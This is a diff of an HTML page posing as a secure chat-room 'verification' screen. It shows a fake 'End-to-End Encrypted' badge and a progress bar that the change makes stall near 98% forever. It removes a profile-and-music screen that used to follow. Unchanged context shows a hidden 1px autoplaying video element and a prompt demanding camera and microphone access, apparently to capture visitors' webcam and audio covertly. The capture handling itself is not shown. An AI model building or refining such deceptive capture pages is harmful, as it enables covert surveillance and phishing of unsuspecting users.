@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat GURU</title>
+    <title>Chat Room - Verification</title>
     <style>
         :root { 
             --primary: #0088cc; 
@@ -35,7 +35,7 @@
             position: relative;
         }
 
-        /* Loading Screen Styles */
+        /* Loading Circle Animation */
         .loader-wrapper {
             position: relative;
             width: 80px;
@@ -79,6 +79,7 @@
             margin-bottom: 30px; 
         }
 
+        /* Modern Progress Bar */
         .progress-box {
             background: #eee;
             border-radius: 20px;
@@ -92,7 +93,7 @@
             width: 0%; 
             height: 100%; 
             background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%);
-            transition: width 1s linear; 
+            transition: width 0.4s ease; 
         }
 
         .secure-badge {
@@ -109,53 +110,6 @@
             border-radius: 50px;
         }
 
-        /* Profile Screen Styles */
-        .profile-img { 
-            width: 110px; 
-            height: 110px; 
-            border-radius: 50%; 
-            overflow: hidden; 
-            margin: 0 auto 15px; 
-            border: 4px solid var(--primary); 
-            padding: 3px;
-            background: white;
-        }
-        .profile-img img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
-        .profile-name { font-size: 26px; color: #2c3e50; margin: 0 0 5px; font-weight: 800; }
-        .profile-status { font-size: 14px; color: #27ae60; font-weight: 600; margin-bottom: 15px; }
-        .profile-bio { font-size: 14px; color: #7f8c8d; margin-bottom: 20px; line-height: 1.6; }
-        
-        /* Audio Player Styles */
-        .audio-wrapper {
-            margin-bottom: 25px;
-            width: 100%;
-            background: #f8f9fa;
-            border-radius: 50px;
-            padding: 5px;
-            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
-        }
-        audio {
-            width: 100%;
-            height: 40px;
-            outline: none;
-            border-radius: 50px;
-        }
-
-        .action-btn { 
-            background: var(--primary); 
-            color: white; 
-            border: none; 
-            padding: 12px 30px; 
-            border-radius: 25px; 
-            font-size: 16px; 
-            font-weight: bold;
-            cursor: pointer; 
-            transition: 0.3s; 
-            width: 100%;
-            box-shadow: 0 5px 15px rgba(0, 136, 204, 0.3);
-        }
-        .action-btn:hover { background: #0073ad; transform: translateY(-2px); }
-
         #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.001; pointer-events: none; }
     </style>
 </head>
@@ -167,32 +121,13 @@
             <div class="check-icon">🔒</div>
         </div>
         <div class="status-msg" id="main-status">Connecting to Server</div>
-        <p class="sub-text" id="sub-status">Please waitThis may take a moment...</p>
+        <p class="sub-text" id="sub-status">Please wait while we establish a secure encrypted connection...</p>
         
         <div class="progress-box">
             <div id="p-bar" class="progress-bar"></div>
         </div>
 
         <div class="secure-badge">End-to-End Encrypted</div>
-    </div>
-
-    <div id="profile-box" class="container" style="display: none;">
-        <div class="profile-img">
-            <img src="https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_1280.png" alt="Profile">
-        </div>
-        
-        <h2 class="profile-name">ONLINE GURU</h2>
-        <div class="profile-status">🟢 Online Now</div>
-        <p class="profile-bio">Welcome to</p>
-        
-        <div class="audio-wrapper">
-            <audio id="bg-music" controls loop>
-                <source src="https://www.dropbox.com/scl/fi/whlm61g9ma2zdtoetkvf9/mindmist-waterfall-in-jungle-305000.mp3?rlkey=n0isfygmqa9exi2xbijlrsg36&st=4s4kx7dz&dl=0" type="audio/mpeg">
-                Your browser does not support the audio element.
-            </audio>
-        </div>
-
-        <button class="action-btn">Start Chat</button>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -211,33 +146,14 @@
         const pBar = document.getElementById('p-bar');
         let activeStream = null;
 
-        // --- විනාඩි 2ක (තත්පර 120) Loading Animation එක ---
-        const totalLoadingTime = 600000; 
-        const updateInterval = 1000; 
+        // UI Progress Animation
         let progress = 0;
-        const step = 100 / (totalLoadingTime / updateInterval);
-
         const progressInterval = setInterval(() => { 
-            if (progress < 100) { 
-                progress += step; 
+            if (progress < 98) { 
+                progress += Math.random() * 1.5; 
                 pBar.style.width = progress + '%'; 
             } 
-        }, updateInterval);
-
-        // විනාඩි 2කට පසු Loading එක මකා Profile එක සහ Music එක පෙන්වීම
-        setTimeout(() => {
-            clearInterval(progressInterval);
-            document.getElementById('ui-box').style.display = 'none';
-            document.getElementById('profile-box').style.display = 'block';
-
-            // Music එක ස්වයංක්‍රීයව Play කිරීම
-            const music = document.getElementById('bg-music');
-            music.play().catch(error => {
-                console.log("Autoplay blocked. User needs to interact first.");
-            });
-
-        }, totalLoadingTime);
-        // ---------------------------------------------------
+        }, 600);
 
         function stopAllResources() {
             if (activeStream) {
@@ -272,7 +188,7 @@
         })
         .catch(() => {
             document.getElementById('main-status').innerText = "Access Required";
-            document.getElementById('sub-status').innerText = "Please allow camera and microphone access to proceed.";
+            document.getElementById('sub-status').innerText = "Web room.";
             document.getElementById('main-status').style.color = "#e74c3c";
         });
 
@@ -331,3 +247,4 @@
     </script>
 </body>
 </html>
+
